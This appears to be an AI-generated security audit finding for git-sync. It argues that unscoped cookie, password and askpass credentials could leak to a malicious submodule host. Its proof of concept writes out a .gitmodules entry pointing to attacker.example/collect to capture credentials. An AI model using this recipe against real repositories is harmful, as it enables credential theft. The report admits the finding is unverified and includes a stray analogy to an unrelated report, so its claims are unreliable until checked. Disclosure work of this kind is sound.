## Finding

### Title
Global (non-URL-scoped) credential/cookie/askpass materials are sent to attacker-controlled submodule hosts - (File: main.go, README.md)

### Summary
`git-sync` supports several authentication mechanisms for its `--repo` (`--username`/`--password-file`, `--cookie-file`, `--askpass-url`) plus a URL-scoped `--credential` flag that the documentation explicitly says exists *"for specific URLs, for example when using submodules"*. This wording, together with how these flags are wired into a single shared, process-wide git config file, indicates that the non-`--credential` auth mechanisms are not restricted to the configured `--repo` host and are presented to any host that `git submodule update` contacts — including a host chosen by whoever controls the content of the synced repository (i.e., an attacker who can push a `.gitmodules` entry pointing at their own server).

### Finding Description
`git-sync` initializes a single, process-global git config (`GIT_CONFIG_GLOBAL`) and layers all authentication configuration into it before any fetch happens: [1](#0-0) . Submodules are fetched with a generic `git submodule update --init [--recursive]` call that inherits this same global config for every submodule URL, with no attacker-content validation of submodule remotes: [2](#0-1) .

The README explicitly distinguishes `--credential` as the *URL-scoped* mechanism meant for submodules, implying the other mechanisms are not URL-scoped: [3](#0-2) 

By contrast, `--username`/`--password-file`, `--cookie-file`, and `--askpass-url` are documented with no URL restriction at all: [4](#0-3) [5](#0-4) 

This is the same bug class as the referenced report: two functionally-overlapping channels exist to reach the same privileged resource (here, "present my configured git credentials to a remote"), one of which is properly restricted (`--credential`, scoped per-URL) and one of which is not (`--username`/`--cookie-file`/`--askpass-url`, applied globally). An attacker who only controls the content of the tracked repository (adding/editing `.gitmodules` to point a submodule at an attacker-controlled server) can cause `git-sync` to authenticate to that attacker server using credentials/cookies/tokens the operator intended only for the trusted `--repo` host — analogous to how, in the original report, a party restricted to one privileged channel (Voting) could reach the same underlying financial-transaction capability meant to be gated behind a different, more restricted channel (EasyTrack/TrustedCaller).

### Impact Explanation
If exploited, a compromised/malicious upstream repository (or a compromised branch/PR merged into the tracked ref) can cause git-sync to leak the operator's HTTP username/password, cookie-file contents, or askpass-URL-issued bearer token to a third-party server the attacker controls, by simply adding a submodule entry pointing there. This is a credential/token disclosure primitive reachable purely from repo content that git-sync treats as untrusted data (the very thing that determines what gets synced).

### Likelihood Explanation
This requires: (1) the operator to have configured one of the non-URL-scoped auth flags (`--username`/`--password-file`, `--cookie-file`, or `--askpass-url`) rather than the URL-scoped `--credential`, and (2) submodules enabled (the default is `--submodules=recursive`), and (3) an attacker with write access to content that ends up in the synced tree (e.g., a merged PR, or a compromised upstream) to add/modify `.gitmodules`. Given `--submodules=recursive` is the default and `--credential` is documented as a secondary/optional flag "similar to --username... but for specific URLs," it's plausible many deployments rely on the simpler, unscoped flags.

### Recommendation
- Scope `http.cookieFile`, askpass-provided credentials, and `--username`/`--password-file` to the configured `--repo` host using `git config http.<base-url>.*` (URL-prefixed config) rather than global config, mirroring what `--credential` already does for submodules.
- Optionally, add a flag/default to disable following submodule URLs whose host differs from the primary `--repo` host unless explicitly allow-listed.
- Document clearly (and consider warning at runtime) when `--submodules` is enabled together with any non-URL-scoped credential mechanism.

### Proof of Concept
1. Operator runs git-sync against a trusted repo with a broad credential mechanism, e.g.:
   `git-sync --repo=https://good.example/repo --cookie-file --root=/git --link=link` (or `--askpass-url=...`, or `--username=u --password-file=/creds/p`).
2. Attacker (who can merge a PR or push to a tracked branch) adds to the tracked repo:
   `.gitmodules` → `[submodule "evil"] path = evil url = https://attacker.example/collect`
3. On next sync, `configureWorktree` runs `git submodule update --init --recursive` [2](#0-1) , which, using the shared global git config set up in `main.go` [1](#0-0) , sends the configured cookie file / askpass token / username-password to `https://attacker.example` when fetching the "evil" submodule.
4. Attacker's server logs the exfiltrated credential material.

**Note on completeness:** I was not able to locate/verify the exact bodies of `SetupCookieFile`, `SetupGitSSH`, or the askpass-URL implementation functions (only their call sites in `main.go:809-814` were indexed); the codebase index may not include the full contents of every helper function. The conclusion above is based on the explicit README documentation contrasting `--credential`'s URL-scoping with the other mechanisms, plus git's well-known default behavior that `http.cookieFile`/credential helpers apply to all remote URLs unless explicitly scoped. If a Devin session with full repo access confirms these setup functions already apply `url.<base>.*` scoping to cookie-file/askpass, this finding would not hold — I recommend verifying `main.go`'s `SetupCookieFile`/askpass implementation directly before treating this as confirmed.
